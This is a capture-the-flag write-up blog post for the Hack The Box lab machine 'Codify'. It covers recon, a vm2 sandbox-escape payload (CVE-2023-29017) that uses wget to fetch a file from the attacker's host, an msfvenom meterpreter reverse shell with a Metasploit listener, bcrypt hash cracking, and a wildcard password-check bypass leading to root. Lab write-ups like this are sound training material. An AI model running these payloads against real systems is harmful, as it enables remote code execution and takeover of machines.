@@ -1,0 +1,130 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Codify | Foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Codify</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-11-05T17:12:14.000Z" id="date"> 2023-11-05</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-01-14T21:05:03.000Z" id="updated"> 2024-01-14</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; justify-content: center; align-items: center;">
+
+  <div style="margin-right: 20px;" class='item-img' data-src='codify.png'><img src="codify.png" title="Codify" width="300px" height="300px" style="pointer-events: none;">
+  </div>
+
+  <div style="display: flex; flex-direction: column; text-align: left;">
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">OS:</strong class='item-img' data-src='linux.png'><img src="linux.png" alt="Linux" width="20px" height="20px" style="margin-left: 5px;">
+      <span style="margin-left: 5px;">Linux</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Difficulty:</strong>
+      <span>Easy</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Author:</strong>
+      <span>kavigihan</span>
+    </div>
+    <div style="display: flex; align-items: center;">
+      <strong style="margin-right: 5px;">Release Date:</strong>
+      <span>November 4, 2023</span>
+    </div>
+  </div>
+
+</div>
+
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sC -sV 10.10.11.239<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-04 19:46 WET<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.239<br>Host is up (0.060s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)<br>|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.52<br>|_http-title: Did not follow redirect to http://codify.htb/<br>|_http-server-header: Apache/2.4.52 (Ubuntu)<br>3000/tcp open  http    Node.js Express framework<br>|_http-title: Codify<br>Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.13 seconds<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>SSH</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+</tr>
+<tr>
+<td>3000</td>
+<td>Node.js</td>
+</tr>
+</tbody></table>
+<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>&#x2F;etc&#x2F;hosts<br class='item-img' data-src='/HTB/Codify/hosts.png'><img src="/HTB/Codify/hosts.png"></p>
+<p>Web Page<br class='item-img' data-src='/HTB/Codify/webpage1.png'><img src="/HTB/Codify/webpage1.png"></p>
+<p>In the about page, we can see that the code editor we can use on the page, uses the vm2 library<br class='item-img' data-src='/HTB/Codify/aboutpage.png'><img src="/HTB/Codify/aboutpage.png"></p>
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Searching for vm2 exploit I came across <a target="_blank" rel="noopener" href="https://socradar.io/critical-vulnerability-in-vm2-javascript-sandbox-library-exploit-code-available/">CVE-2023-29017</a></p>
+<p>It’s a RCE vulnerability, so I tried uploading a file from my machine<br>Created a test file and started a python http server<br class='item-img' data-src='/HTB/Codify/pythonserver1.png'><img src="/HTB/Codify/pythonserver1.png"></p>
+<p>Then I ran this code on the code editor</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text">const &#123;VM&#125; = require(&quot;vm2&quot;);<br>const vm = new VM();<br><br>const code = `<br>async function fn() &#123;<br>    (function stack() &#123;<br>        new Error().stack;<br>        stack();<br>    &#125;)();<br>&#125;<br>p = fn();<br>p.constructor = &#123;<br>    [Symbol.species]: class FakePromise &#123;<br>        constructor(executor) &#123;<br>            executor(<br>                (x) =&gt; x,<br>                (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;wget http://10.10.14.2:1234/test&#x27;); &#125;<br>            )<br>        &#125;<br>    &#125;<br>&#125;;<br>p.then();<br>`;<br><br>console.log(vm.run(code));<br><br></code></pre></td></tr></table></figure>
+
+<p>And I confirmed that it downloaded the file from my machine<br class='item-img' data-src='/HTB/Codify/testfile.png'><img src="/HTB/Codify/testfile.png"></p>
+<p>So now all I have to do is create a reverse shell file, upload it, and then run it from the code editor</p>
+<p>Create the Reverse Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=1337 -f elf &gt;reverse.elf<br></code></pre></td></tr></table></figure>
+
+<p>Start a python http server again</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 -m http.server 1234<br></code></pre></td></tr></table></figure>
+
+<p>And now download the reverse shell to the target machine with this code</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs text">const &#123;VM&#125; = require(&quot;vm2&quot;);<br>const vm = new VM();<br><br>const code = `<br>async function fn() &#123;<br>    (function stack() &#123;<br>        new Error().stack;<br>        stack();<br>    &#125;)();<br>&#125;<br>p = fn();<br>p.constructor = &#123;<br>    [Symbol.species]: class FakePromise &#123;<br>        constructor(executor) &#123;<br>            executor(<br>                (x) =&gt; x,<br>                (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;wget http://10.10.14.2:1234/reverse.elf&#x27;); &#125;<br>            )<br>        &#125;<br>    &#125;<br>&#125;;<br>p.then();<br>`;<br><br>console.log(vm.run(code));<br></code></pre></td></tr></table></figure>
+
+<p>We can confirm that the file was downloaded<br class='item-img' data-src='/HTB/Codify/downloadrevshell.png'><img src="/HTB/Codify/downloadrevshell.png"></p>
+<h3 id="First-Shell"><a href="#First-Shell" class="headerlink" title="First Shell"></a>First Shell</h3><p>Now to get our first shell, first setup a listener</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ msfconsole<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD linux/x86/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 10.10.14.2<br><span class="hljs-built_in">set</span> LPORT 1337<br><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br>run<br></code></pre></td></tr></table></figure>
+
+<p>Run the reverse shell file through the code editor</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text">const &#123;VM&#125; = require(&quot;vm2&quot;);<br>const vm = new VM();<br><br>const code = `<br>async function fn() &#123;<br>    (function stack() &#123;<br>        new Error().stack;<br>        stack();<br>    &#125;)();<br>&#125;<br>p = fn();<br>p.constructor = &#123;<br>    [Symbol.species]: class FakePromise &#123;<br>        constructor(executor) &#123;<br>            executor(<br>                (x) =&gt; x,<br>                (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;./reverse.elf&#x27;); &#125;<br>            )<br>        &#125;<br>    &#125;<br>&#125;;<br>p.then();<br>`;<br><br>console.log(vm.run(code));<br><br></code></pre></td></tr></table></figure>
+
+<p>And we get our first shell on the machine, as the user svc<br class='item-img' data-src='/HTB/Codify/session1.png'><img src="/HTB/Codify/session1.png"><br class='item-img' data-src='/HTB/Codify/svc.png'><img src="/HTB/Codify/svc.png"></p>
+<h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><h3 id="tickets-db"><a href="#tickets-db" class="headerlink" title="tickets.db"></a>tickets.db</h3><p>Looking into &#x2F;var&#x2F;www&#x2F;contact, we can find a tickets.db file.</p>
+<p>Download the file.<br class='item-img' data-src='/HTB/Codify/tickets.png'><img src="/HTB/Codify/tickets.png"></p>
+<p>Get Joshua’s hashed password from the users table<br class='item-img' data-src='/HTB/Codify/userstable.png'><img src="/HTB/Codify/userstable.png"></p>
+<blockquote>
+<p>$2a$12$SOn8Pf6z8fO&#x2F;nVsNbAAequ&#x2F;P6vLRJJl7gCUEiYBU2iLHn4G&#x2F;p&#x2F;Zw2</p>
+</blockquote>
+<h3 id="Decrypting-the-hash"><a href="#Decrypting-the-hash" class="headerlink" title="Decrypting the hash"></a>Decrypting the hash</h3><p>Looking at the hash, and after a quick search, we know that this is a bcrypt hash<br>We can just use john to decrypt it</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ john --format=bcrypt hash.txt <br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Codify/bcrypt.png'><img src="/HTB/Codify/bcrypt.png"></p>
+<h3 id="user-txt-flag"><a href="#user-txt-flag" class="headerlink" title="user.txt flag"></a>user.txt flag</h3><p>Now we can just login as Joshua through ssh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh joshua@10.10.11.239<br></code></pre></td></tr></table></figure>
+
+<p>And we get the user flag<br class='item-img' data-src='/HTB/Codify/userflag.png'><img src="/HTB/Codify/userflag.png"></p>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="mysql-backup-sh"><a href="#mysql-backup-sh" class="headerlink" title="mysql-backup.sh"></a>mysql-backup.sh</h3><p>By running sudo -l, we can see that Joshua can run mysql-backup.sh as root<br class='item-img' data-src='/HTB/Codify/sudo.png'><img src="/HTB/Codify/sudo.png"></p>
+<p>By looking at the mysql-backup.sh code, we see that it checks for the root password on &#x2F;root&#x2F;.creds and checks it against our input, if we input the correct root password, it runs the rest of the code, which creates a backup of the database.</p>
+<p>If we insert an asterisk (*) when asked for the root password, it bypasses the password check and runs the entire code.<br class='item-img' data-src='/HTB/Codify/skippassword.png'><img src="/HTB/Codify/skippassword.png"></p>
+<h3 id="pspy"><a href="#pspy" class="headerlink" title="pspy"></a>pspy</h3><p>We know, that by looking at the script code, it runs some code using the $DB_PASS variable, which is the root password, but when we run the script, it does not show in the terminal.</p>
+<p>For this reason, we can use <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a> to snoop in the process and see the command in plaintext.</p>
+<p>Transfer the pspy script to the target machine, split the terminal and run pspy in one of them.<br>Then run the mysql-backup.sh script on the other terminal.<br>Now we can see the command that was ran using the root password.<br class='item-img' data-src='/HTB/Codify/rootpassword.png'><img src="/HTB/Codify/rootpassword.png"></p>
+<p>Now just get the root flag<br class='item-img' data-src='/HTB/Codify/rootflag.png'><img src="/HTB/Codify/rootflag.png"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Active/">← Next [HTB] Active</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/HTB/Appsanity/">[HTB] Appsanity Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'Foguh' Ferreira</a></h1><div id="description"><p>Junior PenTester</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP"><span class="toc-number">1.2.</span> <span class="toc-text">HTTP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#First-Shell"><span class="toc-number">2.2.</span> <span class="toc-text">First Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">3.</span> <span class="toc-text">Lateral Movement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tickets-db"><span class="toc-number">3.1.</span> <span class="toc-text">tickets.db</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decrypting-the-hash"><span class="toc-number">3.2.</span> <span class="toc-text">Decrypting the hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-txt-flag"><span class="toc-number">3.3.</span> <span class="toc-text">user.txt flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-backup-sh"><span class="toc-number">4.1.</span> <span class="toc-text">mysql-backup.sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pspy"><span class="toc-number">4.2.</span> <span class="toc-text">pspy</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
